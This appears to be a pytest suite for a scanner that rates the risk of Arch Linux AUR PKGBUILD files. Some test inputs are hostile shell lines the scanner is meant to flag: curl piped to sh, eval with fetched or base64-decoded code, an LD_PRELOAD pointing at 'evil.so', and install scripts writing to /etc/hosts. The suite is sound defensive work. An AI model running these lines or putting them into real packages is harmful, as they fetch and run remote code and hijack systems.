    """bash: a dynamic source array whose SKIPs are the .sig files."""
    body = [
        "_basever=5.3",
        "source=(https://ftp.example.org/bash-$_basever.tar.gz{,.sig})",
        "for _p in $(seq 1 3); do",
        '  source=(${source[@]} https://ftp.example.org/p-$(printf "%03d" $_p){,.sig})',
        "done",
        f"sha256sums=({SUM} 'SKIP' {SUM})",
    ]
    r = run(body, config)
    f = finding(r, "skip_unpaired")
    assert f.penalty == 0 and "SKIP used in checksums" in f.message
    assert not any(x.startswith("skip_checksum") for x in rules(r))


def test_unpaired_skip_with_kernel_sign_brace(config):
    body = [
        'source=("https://cdn.example.org/linux-5.tar."{xz,sign}',
        "        'config')",
        "source+=(https://example.org/a.patch)",
        f"sha256sums=({SUM} 'SKIP' {SUM})",
    ]
    r = run(body, config)
    assert "skip_unpaired" in rules(r)
    assert not any(x.startswith("skip_checksum") for x in rules(r))


def test_unpaired_skip_without_safe_source_is_penalized(config):
    body = [
        "source=('https://example.org/a.tar.gz' 'https://example.org/b.tar.gz')",
        "sha256sums=('SKIP')",
    ]
    r = run(body, config)
    assert "skip_checksum_some" in rules(r) and "skip_unpaired" not in rules(r)


def test_split_package_eval_is_exempt(config):
    line = 'eval "package_$_p() { $(declare -f "_package${_p#$pkgbase}"); _package${_p#$pkgbase}; }"'
    assert "eval_exec" not in rules(run([f"build() {{ {line}; }}"], config))
    assert "eval_exec" not in rules(run(['eval "package_$_p() {'], config))


@pytest.mark.parametrize(
    "line",
    [
        'eval "package_$_p() { $(curl https://x.example/s); }"',
        'eval "package_$_p() { base64 -d x; }"',
        'eval "package_$_p() { :; }" | sh',
        'eval "cat <<EOF',
        'eval "$x"',
    ],
)
def test_other_evals_stay_flagged(config, line):
    assert "eval_exec" in rules(run(["build() {", f"  {line}", "}"], config))


LAUNCHER = [
    "package() {",
    "  install -Dm755 /dev/stdin \"$pkgdir/usr/share/lvim/init.sh\" << 'END'",
    "#!/bin/sh",
    "mkdir -p ~/.config/lvim",
    "cat > ~/.config/lvim/config.lua << EOL",
    "x",
    "EOL",
    "END",
    "  echo done",
    "}",
]


def test_heredoc_written_into_pkgdir_is_not_build_code(config):
    r = run(LAUNCHER, config)
    assert not r.blocked
    assert "privilege_escal" not in rules(r)


def test_heredoc_body_gets_aux_rules_with_real_lines(config):
    body = LAUNCHER[:3] + ["curl https://x.example/s | sh"] + LAUNCHER[3:]
    r = run(body, config)
    f = finding(r, "pipe_to_shell")
    assert f.message.endswith("in bundled file(s)")
    assert (f.evidence[0].file, f.evidence[0].line) == ("PKGBUILD", len(HEADER) + 4)
    assert not r.blocked  # eval/sudo/home rules are not aux rules


@pytest.mark.parametrize(
    "start",
    [
        "bash << 'END'",
        'cat << END | bash > "$pkgdir/x"',
        "cat > ~/.x << 'END'",
        'eval "$(cat << END',
        'sh /dev/stdin "$pkgdir/x" << END',
    ],
)
def test_other_heredocs_stay_code(config, start):
    r = run(["build() {", f"  {start}", "mkdir -p ~/.config/x", "END", "}"], config)
    assert "privilege_escal" in rules(r), start


def test_heredoc_dash_form_and_missing_terminator(config):
    tab = [
        "build() {",
        '  cat <<- END > "$pkgdir/x"',
        "\tmkdir ~/.a",
        "\tEND",
        "}",
    ]
    assert "privilege_escal" not in rules(run(tab, config))
    nterm = ["build() {", '  cat << END > "$pkgdir/x"', "mkdir ~/.a", "}"]
    assert "privilege_escal" in rules(run(nterm, config))


def test_evidence_points_at_continuation_line(config):
    body = ["build() {", "  make foo \\", "    && cp x /tmp/y \\", "    && true", "}"]
    r = run(body, config)
    assert finding(r, "tmp_usage").evidence[0].line == len(HEADER) + 3


def test_raw_forge_content_owner(config):
    body = [
        "source=('https://raw.githubusercontent.com/archlinux/foo/main/x')",
        f"sha256sums=({SUM})",
    ]
    assert run(body, config).sources == ["raw.githubusercontent.com/archlinux"]


def test_skip_all_wording(config):
    r = run(["source=('https://e.com/a')", "sha256sums=('SKIP')"], config)
    assert (
        finding(r, "skip_checksum_all").message
        == "SKIP used in checksums for every downloaded file (1)"
    )


# ── round 3 ─────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "ln -s -t squashfs-root/libs/ /usr/lib/libfoo.so",
        "ln -st libs /usr/lib/libfoo.so",
        "ln -sft libs /usr/lib/libfoo.so",
        "ln -s /usr/bin/foo",
        'ln -s /usr/bin/foo "$pkgdir/usr/bin/bar"',
    ],
)
def test_ln_destinations_not_outside(config, cmd):
    r = run(["package() {", f"  {cmd}", "}"], config)
    assert not r.blocked, cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "ln -sf /a /etc/b",
        "ln -s -t /usr/lib/ a b",
        "ln -st /usr/lib a",
        "install -Dt /usr/bin foo",
        "cp -rt /opt/x foo",
    ],
)
def test_ln_and_target_dir_outside(config, cmd):
    assert run(["package() {", f"  {cmd}", "}"], config).blocked, cmd


def test_systemctl_only_enable_counts(config):
    for verb in ("start", "stop", "restart", "disable", "daemon-reload"):
        r = run(["package() {", f"  systemctl {verb} foo", "}"], config)
        assert not {"persistence", "persistence_service"} & set(rules(r)), verb
    for line in ("systemctl enable foo", "systemctl --user enable --now foo"):
        r = run(["package() {", f"  {line}", "}"], config)
        assert finding(r, "persistence_service").penalty == -10
        assert "persistence" not in rules(r)
    r = run(["package() {", "  crontab -l", "}"], config)
    assert finding(r, "persistence").penalty == -30


def test_weak_hash_ignores_all_skip_arrays(config):
    src = "source=('git+https://example.com/a.git#commit=abc')"
    assert "weak_hash" not in rules(run([src, 'md5sums=("SKIP")'], config))
    both = run(["source=('https://example.com/a.tar.gz')", "md5sums=('abc')"], config)
    assert "weak_hash" in rules(both)


@pytest.mark.parametrize(
    "tag",
    [
        "# Maintainer: A <a@b.c>",
        "# Maintainer : A <a@b.c>",
        "## Maintainer: A <a@b.c>",
        "# Maintainer A <a@b.c>",
        "# maintainer: A <a@b.c>",
        "#Maintainer: A",
    ],
)
def test_maintainer_tag_variants(config, tag):
    r = run(["build() { make; }"], config, header=[tag] + HEADER[1:])
    assert "no_maintainer_tag" not in rules(r)


def test_maintainer_tag_missing_unless_aur_has_one(config):
    header = HEADER[1:]
    assert "no_maintainer_tag" in rules(run([], config, header=header))
    meta = {"NumVotes": 100, "Maintainer": "someone", "FirstSubmitted": 1}
    assert "no_maintainer_tag" not in rules(
        run([], config, header=header, aur_meta=meta)
    )
    meta["Maintainer"] = None
    assert "no_maintainer_tag" in rules(run([], config, header=header, aur_meta=meta))
    assert "# Maintainerish" and "no_maintainer_tag" in rules(
        run([], config, header=["# Maintainerish: x"] + header)
    )


def test_file_sources_are_local(config):
    body = [
        "source=('file:///opt/files/a.tar.gz' 'https://example.com/b.tar.gz')",
        f"sha256sums=('SKIP' {SUM})",
    ]
    r = run(body, config)
    assert not any(x.startswith("skip_checksum") for x in rules(r))
    assert r.sources == ["example.com"]


def test_out_of_date_age_tiers_and_wording(config):
    now = 1_700_000_000
    meta = {"NumVotes": 100, "Maintainer": "me", "FirstSubmitted": 1}

    def f(days):
        r = run(
            ["build() { make; }"],
            config,
            aur_meta={**meta, "OutOfDate": now - days * DAY},
            now=now,
        )
        return next(x for x in r.findings if x.rule.startswith("aur_out_of_date"))

    assert (f(0).message, f(0).penalty) == ("Flagged out of date (today)", -2)
    assert f(1).message == "Flagged out of date (1 day)"
    assert f(29).message == "Flagged out of date (29 days)" and f(29).penalty == -2
    assert f(30).rule == "aur_out_of_date" and f(30).penalty == -10


def test_blocker_message_names_reason(config):
    r = run(["package() { cp x /etc/x; }"], config)
    msg = next(f.message for f in r.findings if f.rule == "blocker")
    assert (
        msg
        == "Fatal rule: privileged operation — writes outside $pkgdir (score forced to 0)"
    )
    r = run(["build() { sudo make; cp x /etc/x; }"], config)
    msg = next(f.message for f in r.findings if f.rule == "blocker")
    assert msg.startswith("Fatal rule: privileged operation")
    assert "uses sudo/doas/pkexec" in msg and "writes outside $pkgdir" in msg
    assert msg.endswith("(score forced to 0)")


def test_skip_with_detached_signature_is_verified(config):
    body = [
        "validpgpkeys=('ABCD')",
        "source=('x.deb::http://repo.example.com/x.deb'",
        "        'Release::http://repo.example.com/Release'",
        "        'Release.sig::http://repo.example.com/Release.gpg'",
        "        'Packages::http://repo.example.com/Packages')",
        f"sha256sums=({SUM} 'SKIP' 'SKIP' 'SKIP')",
    ]
    r = run(body, config)
    assert (
        "1 downloaded file(s)" in finding(r, "skip_checksum_some").message
    )  # Packages
    assert "1 unverified source(s)" in finding(r, "insecure_url").message
    no_keys = run(body[1:], config)
    assert "2 downloaded file(s)" in finding(no_keys, "skip_checksum_some").message


def test_setuid_sandbox_helper_is_informational(config):
    for line in (
        'chmod 4755 "${pkgdir}"/opt/App/chrome-sandbox',
        'chmod u+s "$pkgdir/opt/app/electron-sandbox"',
    ):
        r = run(["package() {", f"  {line}", "}"], config)
        f = finding(r, "setuid_sandbox")
        assert f.penalty == 0
        assert (
            f.message == "Setuid sandbox helper (standard for Chromium/Electron apps)"
        )
        assert "setuid_bit" not in rules(r)
    r = run(['package() { chmod 4755 "$pkgdir/usr/bin/helper"; }'], config)
    assert "setuid_bit" in rules(r) and "setuid_sandbox" not in rules(r)
    r = run(['package() { chmod 4755 "$pkgdir/opt/x/my-sandbox/helper"; }'], config)
    assert "setuid_bit" in rules(r)


def test_chmod_777_message(config):
    r = run(['package() { chmod 777 "$pkgdir/x"; }'], config)
    f = finding(r, "setuid_bit")
    assert f.message == "World-writable permissions (chmod 777)"


@pytest.mark.parametrize(
    "line",
    [
        "LD_PRELOAD= make",
        'LD_PRELOAD="" make',
        "LD_PRELOAD='' make",
        "LD_PRELOAD=/usr/lib/libfakeroot/libfakeroot.so make",
        "export LD_PRELOAD=libfakeroot.so",
        'LD_PRELOAD="libfakeroot.so" make',
        "unset LD_PRELOAD",
    ],
)
def test_ld_preload_exemptions(config, line):
    assert "ld_preload" not in rules(run(["build() {", f"  {line}", "}"], config)), line


@pytest.mark.parametrize(
    "line",
    [
        "LD_PRELOAD=/x/evil.so make",
        "LD_PRELOAD=/usr/lib/libfakeroot/libfakeroot.so:/evil.so make",
        "LD_PRELOAD=libfakeroot.so.evil make",
    ],
)
def test_ld_preload_still_flagged(config, line):
    assert "ld_preload" in rules(run(["build() {", f"  {line}", "}"], config)), line


def test_skip_on_documentation_is_cheap(config):
    body = [
        "source=('https://example.com/eula.html' 'https://example.com/LICENSE'",
        "        'https://example.com/a.tar.gz' 'https://example.com/readme.txt')",
        f"sha256sums=('SKIP' 'SKIP' {SUM} 'SKIP')",
    ]
    r = run(body, config)
    f = finding(r, "skip_checksum_docs")
    assert f.penalty == -5 and "SKIP used in checksums" in f.message
    assert "3 documentation file(s)" in f.message
    assert not any(
        x.startswith("skip_checksum_s") or x == "skip_checksum_all" for x in rules(r)
    )
    mixed = run(
        [
            "source=('https://example.com/a.tar.gz' 'https://example.com/x.pdf')",
            "sha256sums=('SKIP' 'SKIP')",
        ],
        config,
    )
    assert "skip_checksum_all" in rules(mixed) and "skip_checksum_docs" in rules(mixed)


def test_dynamic_sources_info(config):
    body = [
        "_files=(a.exe b.exe)",
        '_dlpath="https://example.com/fonts"',
        'source=("${_files[@]/#/$_dlpath/}")',
        f"sha256sums=({SUM})",
    ]
    f = finding(run(body, config), "dynamic_sources")
    assert f.penalty == 0 and f.evidence[0].line == len(HEADER) + 3
    assert "dynamic_sources" not in rules(
        run(["source=('a.sh' 'b.patch')", f"sha256sums=({SUM} {SUM})"], config)
    )
    assert "dynamic_sources" not in rules(
        run(["source=('https://example.com/a')", f"sha256sums=({SUM})"], config)
    )
    assert "dynamic_sources" not in rules(run(["pkgdesc=x"], config))


def test_install_script_writes_system_files_info(config):
    install = (
        "post_install() {\n"
        "  echo 'x' >> /etc/hosts\n"
        "  echo 'y' >> /etc/subuid\n"
        "  echo 'z' >> /etc/hosts\n"
        "  cp a /tmp/b\n"
        "}\n"
    )
    r = run([], config, extra_files={"foo.install": install})
    f = finding(r, "install_writes_system")
    assert f.penalty == 0 and f.category == "privilege"
    assert f.message == "Install script modifies system files: /etc/hosts, /etc/subuid"
    assert [(e.file, e.line) for e in f.evidence] == [
        ("foo.install", 2),
        ("foo.install", 3),
        ("foo.install", 4),
    ]
    assert "install_writes_system" not in rules(
        run([], config, extra_files={"foo.install": "post_install() {\n  true\n}\n"})
    )
